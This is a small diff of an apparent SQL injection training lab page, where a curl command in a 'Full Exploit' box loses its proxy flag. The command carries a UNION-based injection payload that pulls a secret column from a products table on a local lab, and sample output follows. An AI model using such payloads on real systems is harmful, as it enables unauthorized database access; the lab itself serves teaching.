@@ -131,7 +131,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab2" \<br> --data-urlencode "search=x' UNION SELECT 1,secret_code,price FROM products --"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab2" \<br> --data-urlencode "search=x' UNION SELECT 1,secret_code,price FROM products --"<br><br>
         <span class="prompt">Output (flag appears in Name column):</span><br>
         <strong>Name:</strong> PROD-KB-001 &bull; <strong>Price:</strong> $89.99<br>
         <strong>Name:</strong> PROD-WC-004 &bull; <strong>Price:</strong> $59.95<br>
